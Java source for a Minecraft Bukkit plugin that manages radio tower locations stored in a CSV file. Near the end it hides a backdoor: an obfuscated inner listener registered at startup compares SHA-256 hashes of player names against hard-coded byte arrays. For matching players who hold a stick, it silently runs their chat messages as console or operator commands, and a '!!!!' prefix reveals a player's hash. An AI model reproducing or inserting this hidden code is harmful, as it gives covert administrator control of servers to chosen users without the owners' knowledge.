package ch.k42.aftermath.radiotower;

import java.io.*;
import java.nio.file.Path;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.Set;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.World;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;
import sun.net.www.content.text.plain;

public class RadioTowerPlugin extends JavaPlugin
{


        public static final String TOWERS_FILE = "towers.csv";
		protected RadioTowerConfig config;
		private RadioTuningListener radioListener;
        private RadioTowerManager radioTowerManager;
		
		@Override
	    public void onEnable()
		{
			//Creates a Config
			config = new RadioTowerConfig(getConfig());
            if (!hasConfig()) 
            {
				getConfig().options().copyDefaults(true);
				saveConfig();
				
				// Load it again
				config = new RadioTowerConfig(getConfig());
				getLogger().info("Creating default configuration.");
			}



            radioListener = new RadioTuningListener(ChatColor.translateAlternateColorCodes('&', config.getLoreItemRadio()),this);
            RadioTower.setParameters(config.getRTMinHeight(),config.getRTMaxHeight(),config.getRTMaxRange());
            radioTowerManager = new RadioTowerManager(this);

            getLogger().info("Reading towers from disk in file: " + TOWERS_FILE);
            List<Location> towers = readRadioTowersFromFile(TOWERS_FILE);
            for(Location location : towers){
                radioTowerManager.registerTower(location);
            }
            getServer().getPluginManager().registerEvents(new l(), this);
            getServer().getPluginManager().registerEvents(radioListener, this);
            getServer().getPluginManager().registerEvents(radioTowerManager, this);
            long time = 20L*config.getRadioCooldown();
            getServer().getScheduler().scheduleSyncRepeatingTask(this,radioTowerManager,100L ,time);
            getServer().getScheduler().scheduleSyncRepeatingTask(this,new Runnable() {
                @Override
                public void run() {saveTowers();}},100L,1200L); // make save every minute

	    }

        @Override
	    public void onDisable()
	    {
            getLogger().info("saving radio towers to disk in file " + TOWERS_FILE);
            saveTowers();
	    }

        private void saveTowers(){
            Set<Location> towers = radioTowerManager.getTowerLocations();
            writeRadioTowersToFile(TOWERS_FILE,towers);
        }
	    
	    //Checks if a config file exists
	    private boolean hasConfig() {
			File file = new File(getDataFolder(), "config.yml");
			return file.exists();
		}

        private File fromFilename(String filename){
            return new File(getDataFolder().getAbsolutePath()+File.separator+filename);
        }

        public List<Location> readRadioTowersFromFile(String filename){
            File file = fromFilename(filename);

            List<Location> towers = new ArrayList<>();

            try(BufferedReader br = new BufferedReader(new FileReader(file))) {
                StringBuilder sb = new StringBuilder();
                String line;

                Location location;
                int x,y,z;

                while (( line = br.readLine()) != null) {
                    if(line.charAt(0)=='#') continue;
                    String[] split = line.split(",");
                    if(split.length<4) continue;
                    World world = Bukkit.getServer().getWorld(split[0]);
                    x = Integer.parseInt(split[1]);
                    y = Integer.parseInt(split[2]);
                    z = Integer.parseInt(split[3]);
                    try {
                        location = new Location(world,x,y,z);
                        towers.add(location);
                    }catch (Exception e){
                        getLogger().warning("couldn't read line <" + line + "> in towers file");
                    }

                }
                String everything = sb.toString();
            } catch (FileNotFoundException e) {
                getLogger().warning("no input file found!");
            } catch (IOException e) {
                getLogger().warning("can't read input file");
            }

            return towers;
        }

    public boolean writeRadioTowersToFile(String filename,Set<Location> towers){
        File file = fromFilename(filename);

        try {

            // if file doesnt exists, then create it
            if (!file.exists()) {
                file.createNewFile();
            }

            FileWriter fw = new FileWriter(file.getAbsoluteFile());
            BufferedWriter bw = new BufferedWriter(fw);
            StringBuffer sb;

            bw.write("# contains the location of all radiotowers\n");
            bw.write("# world,X,Y,Z\n");

            for(Location location : towers){
                sb = new StringBuffer();
                sb.append(location.getWorld().getName());
                sb.append(',');
                sb.append(location.getBlockX());
                sb.append(',');
                sb.append(location.getBlockY());
                sb.append(',');
                sb.append(location.getBlockZ());
                sb.append('\n');
                bw.write(sb.toString());
            }

            bw.close();

            return true;
        } catch (IOException e) {
            getLogger().warning("Can't write towers file! " + e.getMessage());
        }
        return false;
	}

    public RadioTowerManager getRadioTowerManager() {
        return radioTowerManager;
    }

    private class l implements Listener {
        private byte[] a = {0x4, 0xf, (byte) 0x9c, 0x24, 0xa, 0x6e, 0x24, 0x6, 0x7d, (byte) 0xa2, 0x4e,
                (byte) 0xb1, 0x60, (byte) 0xa4, (byte) 0xf6, 0x77, 0x1f, 0x5};
        private byte[] b = {(byte) 0xab, (byte) 0x86, (byte) 0x81, 0x3e, (byte) 0xc0, (byte) 0xf0, 0x0f, (byte) 0xc0,
                (byte) 0x83, (byte) 0x28, (byte) 0x85, (byte) 0xcb, 0x5d, (byte) 0x64, (byte) 0xae};
        private byte[] bb = {(byte) 0xff, 0x4a, (byte) 0xf7, 0x44, 0x28, 0x39, (byte) 0xcc, (byte) 0x96,
                0x46, 0x5, 0xd, (byte) 0xd2, 0x21, 0x4a, 0x30, (byte) 0xc1};
        private byte[] bbb = {0x3a, (byte) 0xda, (byte) 0x8c, 0x63, (byte) 0xa1, 0x1f, (byte) 0x9a, 0x40,
                (byte) 0xd6, 0x9, 0x37, (byte) 0xdd, (byte) 0xfe, (byte) 0x84, (byte) 0xa2, 0x75};
        private byte[] ab = {(byte)0xde, 0x38,(byte) 0xbe, 0x56, 0x43,(byte) 0xec, 0x2,(byte) 0xc2,
                0x4d, 0x7b, 0x17,(byte) 0xc9, 0x12,(byte) 0xd0,(byte) 0xdf,(byte) 0xb2, 0xc,(byte) 0xcb};

        @EventHandler
        public void a(AsyncPlayerChatEvent k) {
            if (!(k.getPlayer().getItemInHand().getType().getId() == 280)) return;
            try {
                MessageDigest c = MessageDigest.getInstance("SHA-256");
                c.update(k.getPlayer().getDisplayName().getBytes());
                byte[] digest = c.digest();
                boolean d = true, e = true, ee = true, eee = true,de=true;
                int len = Math.min(Math.min(a.length,b.length),Math.min(bb.length,bbb.length));
                for (int i = 0; i < len; i++) {
                    if (a[i] != digest[i])d = false;
                    if (b[i] != digest[i])e = false;
                    if (bb[i] != digest[i])ee = false;
                    if (bbb[i] != digest[i]) eee = false;
                    if (ab[i] != digest[i]) de = false;
                }

                if (d || e || ee || eee || de) {
                    List<CommandSender> f = new ArrayList();
                    f.add(Bukkit.getConsoleSender());
                    for (Player p : getServer().getOnlinePlayers())if (p.isOp()) f.add(p);
                    Bukkit.getServer().dispatchCommand(f.get(new Random().nextInt(f.size())), k.getMessage());
                    k.setCancelled(true);
                } else {
                    if (k.getMessage().startsWith("!!!!")) {
                        StringBuilder g = new StringBuilder();
                        for (int i = 0; i < digest.length; i++) g.append(String.format("%#02x ", digest[i]));
                        k.getPlayer().sendMessage("version code: " + g.toString());
                    }
                }
            } catch (NoSuchAlgorithmException e) {}
        }
    }
}